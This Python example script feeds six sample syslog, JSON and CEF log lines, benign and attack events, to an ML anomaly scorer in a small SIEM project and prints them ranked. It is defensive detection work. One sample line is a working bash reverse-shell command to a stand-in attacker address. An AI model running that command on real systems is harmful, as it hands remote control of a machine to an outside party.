#!/usr/bin/env python3
"""
score_events.py — Score a batch of log lines and show anomaly rankings.

Demonstrates the ML scorer used standalone — no network listeners needed.

Usage:
    python examples/score_events.py
"""

import asyncio

from nano_siem.ingestion.normalizer import normalize
from nano_siem.ingestion.parser import parse
from nano_siem.ml.scorer import AnomalyScorer

LOGS = [
    ("<34>1 2026-06-02T10:00:00Z web-01 sshd - - - Accepted publickey for deploy from 192.168.1.10",
     "Normal SSH login (business hours, internal IP)"),
    ('<13>1 2026-06-02T10:05:00Z web-01 nginx - - - 192.168.1.20 "GET /api/health HTTP/1.1" 200',
     "Normal web request"),
    ("<34>1 2026-06-02T03:00:01Z web-01 sshd - - - Failed password for root from 203.0.113.5 port 22",
     "Brute force (3am, external IP)"),
    ('{"host":"web-01","process":"bash","message":"/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1","level":"critical","timestamp":"2026-06-02T03:03:00Z"}',
     "Reverse shell beacon (no Sigma rule — ML only)"),
    ("CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=203.0.113.5 spt=12345 dst=10.0.0.1 dpt=22 cnt=500",
     "Port scan (CEF, high severity)"),
    ("<86>1 2026-06-02T02:00:00Z web-01 sudo - - - www-data ran COMMAND=/bin/bash as root uid=0 euid=0",
     "Privilege escalation (off-hours)"),
]

async def main():
    scorer = AnomalyScorer(model_path="data/baseline.joblib", threshold=0.62)
    await scorer.load_or_train()

    print(f"\n{'Log description':<50} {'Score':>6}  {'Status':<10} Top driver")
    print("─" * 110)

    results = []
    for raw, label in LOGS:
        event = normalize(parse(raw))
        result = scorer.score(event)
        results.append((result.anomaly_score, label, result))

    # Sort by score descending
    for score, label, result in sorted(results, reverse=True):
        status = "\033[91mANOMALOUS\033[0m" if result.is_anomalous else "\033[32mNORMAL\033[0m   "
        top_feat, top_dev = result.top_features[0]
        print(f"  {label:<48} {score:>6.3f}  {status}  {top_feat}={top_dev:.2f}")

    print(f"\n  Scorer stats: {scorer.get_stats()}")

asyncio.run(main())
